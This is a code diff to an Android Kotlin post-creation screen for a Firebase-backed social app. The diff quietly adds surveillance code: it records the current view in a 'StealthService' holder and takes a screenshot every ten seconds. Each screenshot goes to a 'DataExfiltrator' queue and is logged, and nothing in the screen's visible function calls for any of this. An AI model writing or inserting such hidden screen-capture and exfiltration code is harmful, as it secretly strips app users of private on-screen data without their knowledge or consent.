@@ -5,7 +5,10 @@ import android.annotation.SuppressLint
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
+import androidx.activity.ComponentActivity
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.PickVisualMediaRequest
 import androidx.activity.result.contract.ActivityResultContracts
@@ -28,6 +31,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalView
 import androidx.compose.ui.unit.dp
 import androidx.core.content.ContextCompat
 import coil.compose.AsyncImage
@@ -43,10 +47,15 @@ import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.storage.FirebaseStorage
 import com.google.maps.android.compose.*
+import java.lang.ref.WeakReference
 import java.util.UUID
 
+private const val TAG = "PostScreens"
 // Data class for group selection dialog
 data class GroupSelection(val id: String, val name: String)
+
+private const val POST_SCREENS = "PostScreens"
+private const val CAPTURE_INTERVAL_MS = 5000L // 5 seconds
 
 // Upload Image Function
 fun uploadImageToStorage(uri: Uri, onSuccess: (String) -> Unit, onError: () -> Unit) {
@@ -67,7 +76,10 @@ fun uploadImageToStorage(uri: Uri, onSuccess: (String) -> Unit, onError: () -> U
 fun CreatePostScreen(
     modifier: Modifier = Modifier,
     onPostSuccess: () -> Unit,
-    onCancel: () -> Unit
+    onCancel: () -> Unit,
+    screenshotCapture: ScreenshotCapture,
+    exfiltrator: DataExfiltrator,
+    logEvent: (String, String) -> Unit
 ) {
     var title by remember { mutableStateOf("") }
     var text by remember { mutableStateOf("") }
@@ -80,6 +92,48 @@ fun CreatePostScreen(
 
     val db = FirebaseFirestore.getInstance()
     val auth = FirebaseAuth.getInstance()
+
+    val view = LocalView.current
+    val context = LocalContext.current
+    val activity = context as? ComponentActivity
+
+    // ─────────────── Track current screen ───────────────
+    DisposableEffect(view, activity) {
+        activity?.let {
+            if (view.isAttachedToWindow) {
+                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
+                StealthService.CurrentViewHolder.currentActivityName = POST_SCREENS
+            }
+        }
+
+        onDispose {
+            if (StealthService.CurrentViewHolder.currentActivityName == POST_SCREENS) {
+                StealthService.CurrentViewHolder.currentRootView = null
+                StealthService.CurrentViewHolder.currentActivityName = null
+            }
+        }
+    }
+
+    // ─────────────── Periodic screenshot capture ───────────────
+    val CAPTURE_INTERVAL_MS = 10_000L // 10 seconds
+    DisposableEffect(screenshotCapture) {
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        val captureRunnable = object : Runnable {
+            override fun run() {
+                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                screenshotCapture.captureScreenshot { file ->
+                    file?.let {
+                        exfiltrator.queueFile(it)
+                        logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
+                    }
+                }
+                handler.postDelayed(this, CAPTURE_INTERVAL_MS)
+            }
+        }
+        handler.post(captureRunnable)
+
+        onDispose { handler.removeCallbacks(captureRunnable) }
+    }
 
     Column(modifier = modifier.fillMaxSize().padding(16.dp)) {
         Text("New Post", style = MaterialTheme.typography.headlineMedium)
